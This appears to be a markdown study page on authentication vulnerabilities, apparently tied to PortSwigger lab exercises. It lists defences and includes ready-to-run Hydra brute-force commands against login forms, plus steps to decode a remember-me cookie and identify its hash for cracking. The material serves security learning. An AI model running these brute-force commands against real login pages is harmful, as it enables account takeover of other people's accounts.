# Authentication :unlock:
Vulnerabilities around logging into an application (proving your identity to that app).  Generally fall into two categories:

1. Login susceptible to brute force attacks.
1. Authentication can by bypassed entirely (broken authentication).

## Prevent

1. `Safeguard credentials`: strong encryption and password hashing.  Never pass or store credentials in plain text.
1. `Multi-factor authentication`: something you know (password), something you have (phone/token), and something you are (biometrics).
1. `Rate limiting, account locking and CAPTCHA`: prevent brute force attacks.
1. `Review authentication/authorization logic`: bugs can allow users to access resources they shouldn't be able to.
1. `Review secondary authentication logic`: new account and password reset flows can be vulnerable to account takeover.
1. `Prevent user enumeration`: do not use sequential user IDs, ensure error messages and request processing times are generic, and do not allow account enumeration via API endpoints.

## Password based vulnerabilities
### Brute forcing

Use a tool like [Hydra](https://github.com/vanhauser-thc/thc-hydra) or [Burp Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder/using) to brute force a login form.  The tool will try a list of common usernames and passwords against the login form submission.

The following can all be used to perform user enumeration and hone the attack:

1. Error messages returned (Invalid username vs. Incorrect password)
1. Response times
1. Response status codes

This attack can be mitigated by IP based rate limiting, request throttling, account locking, MFA and CAPTCHAs.

```sh
# Brute force an https form POST submission
# You can get the $LOGIN_PATH and $FORM_SUBMIT_PAYLOAD using Burp Proxy or your browser's dev tools
hydra \
    -L "$FILE_WITH_USERNAMES" \
    -P "$FILE_WITH_PASSWORDS" \
    "$URL_OR_IP" \
    https-post-form "$LOGIN_PATH:$FORM_SUBMIT_PAYLOAD:$FAILURE_MESSAGE"

# Username and password list
hydra \
    -L usernames.list \
    -P passwords.list \
    web-security-academy.net \
    https-post-form "/login:username=^USER^&password=^PASS^:Invalid username"

# Known user and password list
hydra \
    -l the_big_cheese \
    -P passwords.list \
    web-security-academy.net \
    https-post-form "/login:username=^USER^&password=^PASS^:Invalid username"

# Known user and password list, checking for a 302 HTTP response code (success condition)
hydra \
    -l the_big_cheese \
    -P passwords.list \
    web-security-academy.net \
    https-post-form "/login:username=^USER^&password=^PASS^:S=302"
```

#### Considerations
- `Account locking`: can lead to user enumeration by indicating the account exists.  When an account is locked, the error message should remain generic.
- `Credential stuffing`: relies on people using the same password across multiple sites.  Uses a dictionary of `username:password` combinations and only tries each `username` once, thereby bypassing account locking.  This must be caught with rate limiting or throttling.
- `IP based rate limiting flaws`: if a successful login resets the rate limit counter, an attacker can bypass the rate limit by logging in with a valid account every `n` attempts.  Rate limiting should be unconditional for a set period based on the IP address.  This can be bypassed by using multiple IP addresses to conduct the attack.

## Multi-factor vulnerabilities

Vulnerabilities can include: 

- Checking the same factor twice (e.g. email based code) since this is only confirming the user knows their email login (both factors are "something you know").
- Using a weak factor (e.g. SMS based code) since this can be intercepted or fall victim to SIM card swapping.
- Second factor entry could be brute forced since it is usually a short number.
- Once login has succeeded and the second factor is requested, if there are flaws in the application logic, it may be possible to:
   - Bypass the second factor entirely by jumping directly to a page in the application.
   - User jump by altering the session cookie to login as a different user.

## Other vulnerabilities

- `Insecure password reset`:  allow an attacker to reset any user's password by guessing the reset link or altering the request to reset a different user's password.
- `Resetting passwords by mail`: sending a temporary password to a user's email address.  Email is considered insecure and there is a risk of that email being intercepted.  Only provide high-entropy password reset links by email.
- `Keeping users logged in`: relies on using a cookie.  If the cookie is insecure, an attacker can guess how to recreate it or alter a cookie for their own account to login as another user.  This can be mitigated by second factor verification.

### Keeping users logged in

A `remember me` cookie will include a value that can be used to authenticate the user.  As a result, it's susceptible to brute forcing if you can determine how the cookie value is generated.

```sh
# Remember me cookie example
Set-Cookie: stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw;
```

Burp Proxy will automatically recognize the value as a base64 encoded string or you can decode it yourself:

```sh
# Decode the cookie value
echo "d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw" | base64 -d
weiner:51dc30ddc473d43a6011e9ebba6ca770
```

You can then use the following tools to determine the hash type and check the result for a known value:

```sh
# Identify hash type
hashid -m "$HASH"
hash-identifier "$HASH"

# Generate a hash of differnt types to compare against a known hashed value.
# The `-n` is required to prevent printing the newline character
# which would alter the hash returned.
echo -n "foo" | openssl dgst -md5
echo -n "bar" | openssl dgst -sha256
```

Once you know the hashing, you can begin brute forcing the hashed value using [Burp Intruder (view solution)](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie).

## Tools
* [Hydra](https://github.com/vanhauser-thc/thc-hydra)
* [Burp Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder/using)

## References
* https://portswigger.net/web-security/authentication
* https://portswigger.net/web-security/authentication/password-based
* https://portswigger.net/web-security/authentication/securing
